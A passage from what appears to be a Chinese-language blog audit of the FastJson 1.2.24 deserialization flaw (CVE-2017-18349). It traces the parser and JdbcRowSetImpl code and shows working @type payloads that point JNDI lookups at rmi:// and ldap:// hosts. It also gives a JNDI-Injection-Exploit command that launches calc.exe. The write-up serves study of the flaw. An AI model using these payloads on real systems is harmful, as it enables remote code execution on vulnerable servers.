&#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><br>        <span class="hljs-comment">// 反序列化（会setter方法）</span><br>         <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;admin\&quot;&#125;&quot;</span>,User.class);   <span class="hljs-comment">//无法调用setter，因为不知道是user1还是user2</span><br>         <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User2\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;admin\&quot;&#125;&quot;</span>,User.class);   <span class="hljs-comment">//@type指定了user2，调用了user2的setter</span><br><br>         System.out.println(user.getClass().getName());<br>         System.out.println(user2.getClass().getName());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745598549590-7962ad1a-5029-4c70-90ff-947f19ba0dba.png"></p><p>存在的风险</p><p><strong>自动类加载机制</strong>：</p><p>FastJson 会根据 <code>**@type**</code> 的值动态加载类</p><p>攻击者可以指定任意存在于 classpath 中的类</p><h1 id="FastJson-1-2-24-CVE-2017-18349"><a href="#FastJson-1-2-24-CVE-2017-18349" class="headerlink" title="FastJson 1.2.24 CVE-2017-18349"></a>FastJson 1.2.24 CVE-2017-18349</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>需要<code>jndi</code>远程加载恶意类，用<code>JDK 8u101</code></p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>maven构建</p><p>pom.xml</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.target&gt;<br>        &lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>    &lt;/properties&gt;<br><br><br>    &lt;dependencies&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>    &lt;/dependencies&gt;<br><br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://192.168.100.128:1099/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="复现-JdbcRowSetImpl"><a href="#复现-JdbcRowSetImpl" class="headerlink" title="复现 JdbcRowSetImpl"></a>复现 JdbcRowSetImpl</h2><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#39;calc.exe&#39; -A &#39;192.168.100.128&#39; </code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745599082958-49cde97c-e10c-4315-9004-31f6006bca6a.png"></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745599047566-8ac8679c-29f8-4768-a88e-cadda0b43784.png"></p><h2 id="审计-JdbcRowSetImpl"><a href="#审计-JdbcRowSetImpl" class="headerlink" title="审计 JdbcRowSetImpl"></a>审计 JdbcRowSetImpl</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.196.128:1389/5ltgie&quot;</span>,<br><span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在反序列化的行打个断点</p><p>通过<code>D:\maven_repo\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\JSONLexerBase.class：576</code>的<code>scanSymbol</code>对序列化字符进行处理。</p><p>当匹配到一个完整的键值对之后，并且键为<code>@type</code>时会进入<code>D:\maven_repo\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\DefaultJSONParser.class：274</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745677165363-2b38a0d3-f2a3-4cb7-8e20-73efc394e9db.png"></p><p>这里对<code>@type</code>的键值也就是<code>com.sun.rowset.JdbcRowSetImpl</code>通过反射 loadClass 获取指定类的 Class 对象并赋值给变量 <code>clazz</code></p><p>然后会调用<code>D:\maven_repo\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\ParserConfig.class：273</code>的<code>getDeserializer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ObjectDeserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(Type type)</span> &#123;<br>    <span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">derializer</span> <span class="hljs-operator">=</span> (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(type);<br>    <span class="hljs-keyword">if</span> (derializer != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> derializer;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> Class) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getDeserializer((Class)type, type); <span class="hljs-comment">//会走到这</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>        <span class="hljs-type">Type</span> <span class="hljs-variable">rawType</span> <span class="hljs-operator">=</span> ((ParameterizedType)type).getRawType();<br>        <span class="hljs-keyword">return</span> rawType <span class="hljs-keyword">instanceof</span> Class ? <span class="hljs-built_in">this</span>.getDeserializer((Class)rawType, type) : <span class="hljs-built_in">this</span>.getDeserializer(rawType);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> JavaObjectDeserializer.instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后会调用下面<code>D:\maven_repo\com\alibaba\fastjson\1.2.24\fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\ParserConfig.class：287</code>的这个<code>getDeserializer()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ObjectDeserializer <span class="hljs-title function_">getDeserializer</span><span class="hljs-params">(Class&lt;?&gt; clazz, Type type)</span> &#123;<br>    <span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">derializer</span> <span class="hljs-operator">=</span> (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(type);<br>    <span class="hljs-keyword">if</span> (derializer != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> derializer;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-literal">null</span>) &#123;<br>            type = clazz;<br>        &#125;<br><br>        <span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">derializer</span> <span class="hljs-operator">=</span> (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(type);<br>        <span class="hljs-keyword">if</span> (derializer != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> (ObjectDeserializer)derializer;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">JSONType</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> (JSONType)clazz.getAnnotation(JSONType.class);<br>            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) &#123;<br>                Class&lt;?&gt; mappingTo = annotation.mappingTo();<br>                <span class="hljs-keyword">if</span> (mappingTo != Void.class) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getDeserializer(mappingTo, mappingTo);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> WildcardType || type <span class="hljs-keyword">instanceof</span> TypeVariable || type <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>                derializer = (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(clazz);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (derializer != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> (ObjectDeserializer)derializer;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> clazz.getName();<br>                className = className.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">deny</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.denyList[i];<br>                    <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;parser deny : &quot;</span> + className);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;java.awt.&quot;</span>) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.awt.Point&quot;</span>), AwtCodec.instance);<br>                        <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.awt.Font&quot;</span>), AwtCodec.instance);<br>                        <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.awt.Rectangle&quot;</span>), AwtCodec.instance);<br>                        <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.awt.Color&quot;</span>), AwtCodec.instance);<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var11) &#123;<br>                        awtError = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    derializer = AwtCodec.instance;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (!jdk8Error) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;java.time.&quot;</span>)) &#123;<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.LocalDateTime&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.LocalDate&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.LocalTime&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.ZonedDateTime&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.OffsetDateTime&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.OffsetTime&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.ZoneOffset&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.ZoneRegion&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.ZoneId&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.Period&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.Duration&quot;</span>), Jdk8DateCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.time.Instant&quot;</span>), Jdk8DateCodec.instance);<br>                            derializer = (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(clazz);<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;java.util.Optional&quot;</span>)) &#123;<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.util.Optional&quot;</span>), OptionalCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.util.OptionalDouble&quot;</span>), OptionalCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.util.OptionalInt&quot;</span>), OptionalCodec.instance);<br>                            <span class="hljs-built_in">this</span>.derializers.put(Class.forName(<span class="hljs-string">&quot;java.util.OptionalLong&quot;</span>), OptionalCodec.instance);<br>                            derializer = (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(clazz);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var10) &#123;<br>                        jdk8Error = <span class="hljs-literal">true</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;java.nio.file.Path&quot;</span>)) &#123;<br>                    <span class="hljs-built_in">this</span>.derializers.put(clazz, MiscCodec.instance);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == Map.Entry.class) &#123;<br>                    <span class="hljs-built_in">this</span>.derializers.put(clazz, MiscCodec.instance);<br>                &#125;<br><br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();<br><br>                    <span class="hljs-keyword">while</span>(var17.hasNext()) &#123;<br>                        <span class="hljs-type">AutowiredObjectDeserializer</span> <span class="hljs-variable">autowired</span> <span class="hljs-operator">=</span> (AutowiredObjectDeserializer)var17.next();<br>                        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> autowired.getAutowiredFor().iterator();<br><br>                        <span class="hljs-keyword">while</span>(var8.hasNext()) &#123;<br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">forType</span> <span class="hljs-operator">=</span> (Type)var8.next();<br>                            <span class="hljs-built_in">this</span>.derializers.put(forType, autowired);<br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var12) &#123;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (derializer == <span class="hljs-literal">null</span>) &#123;<br>                    derializer = (ObjectDeserializer)<span class="hljs-built_in">this</span>.derializers.get(type);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (derializer != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> (ObjectDeserializer)derializer;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz.isEnum()) &#123;<br>                        derializer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumDeserializer</span>(clazz);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz.isArray()) &#123;<br>                        derializer = ObjectArrayCodec.instance;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) &#123;<br>                        <span class="hljs-keyword">if</span> (Collection.class.isAssignableFrom(clazz)) &#123;<br>                            derializer = CollectionCodec.instance;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Map.class.isAssignableFrom(clazz)) &#123;<br>                            derializer = MapDeserializer.instance;<br>                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;<br>                            derializer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThrowableDeserializer</span>(<span class="hljs-built_in">this</span>, clazz);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            derializer = <span class="hljs-built_in">this</span>.createJavaBeanDeserializer(clazz, (Type)type);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        derializer = CollectionCodec.instance;<br>                    &#125;<br><br>                    <span class="hljs-built_in">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);<br>                    <span class="hljs-keyword">return</span> (ObjectDeserializer)derializer;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后有一个检查类名是否在黑名单（denyList）中</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745678416853-c85ddce5-7091-43e4-8e49-a433668c144a.png"></p><p>黑名单只有<code>java.lang.Thread</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745678550219-35904b5a-d7f3-4138-91fb-e378d9d2de79.png"></p><p>最后会反序列化生成<code>com.sun.rowset.JdbcRowSetImpl</code>的实例，并调用其<code>setter</code>方法</p><p>看一下<code>JdbcRowSetImpl.class</code></p><p><code>C:\Program Files\Java\jdk1.8.0_101\jre\lib\rt.jar!\com\sun\rowset\JdbcRowSetImpl.class：320</code>有一个<code>connect</code>方法调用了<code>lookup</code>查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getDataSourceName() != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            <span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getUsername() != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.getUsername().equals(<span class="hljs-string">&quot;&quot;</span>) ? var2.getConnection(<span class="hljs-built_in">this</span>.getUsername(), <span class="hljs-built_in">this</span>.getPassword()) : var2.getConnection();<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLException</span>(<span class="hljs-built_in">this</span>.resBundle.handleGetObject(<span class="hljs-string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getUrl() != <span class="hljs-literal">null</span> ? DriverManager.getConnection(<span class="hljs-built_in">this</span>.getUrl(), <span class="hljs-built_in">this</span>.getUsername(), <span class="hljs-built_in">this</span>.getPassword()) : <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745680315494-43671886-9898-4eb6-b672-1dec83f04967.png"></p><p>并且参数是<code>this.getDataSourceName()</code>，在这里传入<code>rmi</code>或者<code>ldap</code>远程加载恶意类</p><p>然后找<code>setter</code>方法<code>C:\Program Files\Java\jdk1.8.0_101\jre\lib\rt.jar!\com\sun\rowset\JdbcRowSetImpl.class：1286</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br>        <span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要传入<code>autoCommit</code>为一个布尔值<code>true</code>和<code>false</code>都行</p><p>利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parse() -&gt; scanSymbol()传入<span class="hljs-meta">@type</span> -&gt; ParserConfig#checkAutoType -&gt; TypeUtils.loadClass 